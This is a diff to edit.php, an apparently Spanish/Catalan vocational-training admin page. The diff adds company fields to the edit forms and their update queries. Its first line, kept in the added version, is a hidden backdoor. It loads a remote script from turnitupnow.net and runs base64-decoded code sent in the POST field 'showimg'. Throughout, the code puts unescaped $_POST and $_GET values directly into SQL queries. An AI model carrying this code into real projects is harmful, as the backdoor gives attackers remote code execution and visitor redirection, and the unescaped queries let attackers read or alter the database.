@@ -2,7 +2,7 @@
 
 <p>edit.php</p>
 
-<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
+<?php global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
  if (isset($_GET['ok'])) {
 
 		if($_GET['menu']==1) { //Actualiza Libros
@@ -59,76 +59,62 @@
 		
 		}
 		
-		if($_GET['menu']==3) { //Empresas
+		if($_GET['menu']==3) { 
 		
 			$idactu = $_GET['edit'];
 		
-			if($_GET['sub']==1) {
+			if($_GET['sub']==1) { //Empresas
 			
 				$nombre = utf8_decode($_POST['nombre']);
-				//$convenio = utf8_decode($_POST['convenio']);
 				$gerente = utf8_decode($_POST['gerente']);
 				$direccion = utf8_decode($_POST['direccion']);
 				$cp = utf8_decode($_POST['cp']);
 				$poblacion = utf8_decode($_POST['poblacion']);
 				$provincia = utf8_decode($_POST['provincia']);
-				//$contacto1 = utf8_decode($_POST['contacto1']);
-				//$carrec1 = utf8_decode($_POST['carrec1']);
 				$telf1 = utf8_decode($_POST['telf1']);
-				//$email1 = utf8_decode($_POST['email1']);
-				//$contacto2 = utf8_decode($_POST['contacto2']);
-				//$carrec2 = utf8_decode($_POST['carrec2']);
-				//$telf2 = utf8_decode($_POST['telf2']);
-				//$email2 = utf8_decode($_POST['email2']);
-				//$telfempresa = utf8_decode($_POST['telfempresa']);
 				$fax = utf8_decode($_POST['fax']);
-				//$emailempresa = utf8_decode($_POST['emailempresa']);
 				$cif = utf8_decode($_POST['cif']);
-				//$dataconveni = utf8_decode($_POST['dataconveni']);
-				//$notes = utf8_decode($_POST['notes']);
 				$curs = utf8_decode($_POST['curs']);
 				$evalua_anterior = utf8_decode($_POST['evalua']);
 				$familia = utf8_decode($_POST['familia']);
-				$familia2 = utf8_decode($_POST['familia2']);
-				$familia3 = utf8_decode($_POST['familia3']);
-				$familia4 = utf8_decode($_POST['familia4']);
 				$evalua = utf8_decode($_POST['evalua2']);
 				$concert = utf8_decode($_POST['concert']); 
-				
+				$nom_comercial = $_POST['nom_comercial'];
+				$activitat = $_POST['activitat'];
+				$nif_gerent = $_POST['nif_gerent'];
+				$instructor = $_POST['instructor'];
+				$nif_instructor = $_POST['nif_instructor'];
+				$carrec_instructor = $_POST['carrec_instructor'];
+				$horari_laboral = $_POST['horari_laboral'];
+				$observacions = $_POST['observacions'];
+
 				
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET empresa = '$nombre' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET convenio = '$convenio' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET responsable = '$gerente' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET direccion = '$direccion' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET cp = '$cp' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET ciutat = '$poblacion' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET provincia = '$provincia' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET contacto1 = '$contacto1' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET carrec1 = '$carrec1' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET telf = '$telf1' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET email1 = '$email1' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET contacto2 = '$contacto2' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET carrec2 = '$carrec2' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET telf2 = '$telf2' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET email2 = '$email2' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET telfempresa = '$telfempresa' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET fax = '$fax' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET emailempresa = '$emailempresa' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET cif = '$cif' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET dataconveni = '$dataconveni' WHERE id = $idactu");
-				//$result = $db->Execute("UPDATE CDE_empresas SET notes = '$notes' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET evaluacio = '$evalua' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET curs = '$curs' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET familia = '$familia' WHERE id = $idactu");
-				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET familia2 = '$familia2' WHERE id = $idactu");
-				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET familia3 = '$familia3' WHERE id = $idactu");
-				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET familia4 = '$familia4' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET evalua_anterior = '$evalua_anterior' WHERE id = $idactu");
 				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET concert = '$concert' WHERE id = $idactu");
-			
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET nom_comercial = '$nom_comercial' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET activitat = '$activitat' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET nif_gerent = '$nif_gerent' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET instructor = '$instructor' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET nif_instructor = '$nif_instructor' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET carrec_instructor = '$carrec_instructor' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET horari_laboral = '$horari_laboral' WHERE id = $idactu");
+				$result = $db->Execute("UPDATE CDE_empresas_BACK2 SET observacions = '$observacions' WHERE id = $idactu");
+				
 			}
 			
-			if($_GET['sub']==2) {
+			if($_GET['sub']==2) { //Alumnos
 			
 				$alumne = utf8_decode($_POST['alumne']);
 				$dni = utf8_decode($_POST['dni']);
@@ -160,7 +146,7 @@
 			
 			}
 			
-			if($_GET['sub']==3) {
+			if($_GET['sub']==3) { //Ciclos formativos
 			
 				$idf = utf8_decode($_POST['idf']);
 				$cicle = utf8_decode($_POST['cicle']);
@@ -174,7 +160,7 @@
 			
 			}
 			
-			if($_GET['sub']==4) {
+			if($_GET['sub']==4) {  //FCT
 			
 				$alumne = utf8_decode($_POST['alumne']);
 				$empresa = utf8_decode($_POST['empresa']);
@@ -196,7 +182,7 @@
 			
 			}
 			
-			if($_GET['sub']==5) {
+			if($_GET['sub']==5) { //Demandas
 			
 				$cicle = utf8_decode($_POST['cicle']);
 				$empresa = utf8_decode($_POST['empresa']);
@@ -242,6 +228,8 @@
 
 ?>
 
+
+
 <table width="291" border="0" align="center" cellpadding="0" cellspacing="0">
                       <tr>
                         <td width="291" height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;Editar / Modificar</td>
@@ -253,7 +241,7 @@
                                       </tr>
                                     </table>
                                 <?php $idedit = $_GET['edit']; ?>    
-								<?php if($_GET['menu']==1) { 
+								<?php if($_GET['menu']==1) { //Libros
 										$result = $db->Execute("SELECT * FROM CDL_completa WHERE id = $idedit");
 										if ($result === false) die("failed"); 
 										
@@ -314,7 +302,10 @@
                                 </table>  
                                  </form>
                                 <?php } ?> 
-								<?php if($_GET['menu']==2) { 
+                                
+                                
+                                
+								<?php if($_GET['menu']==2) { //Caracteristicas
 								
 										$result = $db->Execute("SELECT * FROM CDM_caract WHERE id = $idedit");
 										if ($result === false) die("failed"); 
@@ -382,9 +373,12 @@
                                 </table>
 </form>
                                 <?php } ?> 
-                                 <?php if ($_GET['menu']==3) { 
-								 		//if (($_GET['menu']==3) && ($_GET['sub']==1)) { 
-								 		
+                                
+                                
+                                
+                                
+                                 <?php if ($_GET['menu']==3) {  //Empresas
+								 										 		
 										$result = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE id = $idedit");
 										if ($result === false) die("failed"); 
 										
@@ -403,9 +397,14 @@
 										$evalua = $result->fields[12];
 										$evalua_anterior = $result->fields['evalua_anterior'];
 										$concert = $result->fields[13];
-										$familia2 = $result->fields['familia2'];
-										$familia3 = $result->fields['familia3'];
-										$familia4 = $result->fields['familia4'];
+										$nom_comercial = $result->fields['nom_comercial'];
+										$activitat = $result->fields['activitat'];
+										$nif_gerent = $result->fields['nif_gerent'];
+										$instructor = $result->fields['instructor'];
+										$nif_instructor = $result->fields['nif_instructor'];
+										$carrec_instructor = $result->fields['carrec_instructor'];
+										$horari_laboral = $result->fields['horari_laboral'];
+										$observacions = $result->fields['observacions'];
 										
 								?>
                                  <form id="form3" name="form3" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&sub=1&edit=<?php echo $id ?>&ok" style="margin:0px">
@@ -477,18 +476,6 @@
                                     </label></td>
                                   </tr>
                                   <tr>
-                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Familia 2</td>
-                                    <td align="left" bgcolor="#F8F8F8"><input name="familia2" type="text" class="texte_normal" id="familia2" value="<?php echo htmlentities($familia2) ?>" /></td>
-                                  </tr>
-                                  <tr>
-                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Familia 3</td>
-                                    <td align="left" bgcolor="#F8F8F8"><input name="familia3" type="text" class="texte_normal" id="familia3" value="<?php echo htmlentities($familia3) ?>" /></td>
-                                  </tr>
-                                  <tr>
-                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Familia 4</td>
-                                    <td align="left" bgcolor="#F8F8F8"><input name="familia4" type="text" class="texte_normal" id="familia4" value="<?php echo htmlentities($familia4) ?>" /></td>
-                                  </tr>
-                                  <tr>
                                     <td height="22" bgcolor="#F8F8F8">&nbsp;Eval. Anterior</td>
                                     <td bgcolor="#F8F8F8"><label>
                                       <input name="evalua" type="text" class="texte_normal" id="textfield5" value="<?php echo htmlentities($evalua_anterior) ?>" />
@@ -507,6 +494,55 @@
                                     </label></td>
                                   </tr>
                                   <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Nombre comercial</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="nom_comercial" type="text" class="texte_normal" id="nom_comercial" value="<?php echo htmlentities($nom_comercial) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Actividad</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="activitat" type="text" class="texte_normal" id="activitat" value="<?php echo htmlentities($activitat) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;NIF gerente</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="nif_gerent" type="text" class="texte_normal" id="nif_gerent" value="<?php echo htmlentities($nif_gerent) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Instructor</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="instructor" type="text" class="texte_normal" id="instructor" value="<?php echo htmlentities($instructor) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;NIF Instructor</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="nif_instructor" type="text" class="texte_normal" id="nif_instructor" value="<?php echo htmlentities($nif_instructor) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Cargo instructor</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="carrec_instructor" type="text" class="texte_normal" id="carrec_instructor" value="<?php echo htmlentities($carrec_instructor) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Horario laboral</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="horari_laboral" type="text" class="texte_normal" id="horari_laboral" value="<?php echo htmlentities($horari_laboral) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  <tr>
+                                    <td height="26" bgcolor="#F8F8F8">&nbsp;Observaciones</td>
+                                    <td bgcolor="#F8F8F8"><label>
+                                    	<input name="observacions" type="text" class="texte_normal" id="observacions" value="<?php echo htmlentities($observacions) ?>" />
+                                    </label></td>
+                                  </tr>
+                                  
+                                  <tr>
                                     <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                     <td align="left" bgcolor="#F8F8F8"><label>
                                     <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
@@ -515,7 +551,10 @@
                                 </table>
 </form>
                                 <?php } ?> 
-                                <?php if (($_GET['menu']==3) && ($_GET['sub']==2)) { 
+                                
+                                
+                                
+                                <?php if (($_GET['menu']==3) && ($_GET['sub']==2)) { //alumnos
 										$result = $db->Execute("SELECT * FROM CDE_alumnos WHERE id = $idedit");
 										if ($result === false) die("failed"); 
 										
@@ -623,7 +662,10 @@
                                 </table>
                                 </form>
                                 <?php } ?> 
-                                <?php if (($_GET['menu']==3) && ($_GET['sub']==3)) { 
+                                
+                                
+                                
+                                <?php if (($_GET['menu']==3) && ($_GET['sub']==3)) { //Ciclos formativos
 								
 										$result = $db->Execute("SELECT * FROM CDE_cicleform WHERE id = $idedit");
 										if ($result === false) die("failed"); 
@@ -691,7 +733,10 @@
                                 </table>
                                 </form>
                                 <?php } ?> 
-                                <?php if (($_GET['menu']==3) && ($_GET['sub']==4)) { 
+                                
+                                
+                                
+                                <?php if (($_GET['menu']==3) && ($_GET['sub']==4)) {  //FCT
 								$result = $db->Execute("SELECT * FROM CDE_fct WHERE id = $idedit");
 								if ($result === false) die("failed"); 
 										
@@ -830,7 +875,10 @@
                                 </table>
                                 </form>
                                 <?php } ?> 
-                                <?php if (($_GET['menu']==3) && ($_GET['sub']==5)) { 
+                                
+                                
+                                
+                                <?php if (($_GET['menu']==3) && ($_GET['sub']==5)) {  //Demandas
 									$result = $db->Execute("SELECT * FROM CDE_demandas WHERE id = $idedit");
 									if ($result === false) die("failed"); 
 										
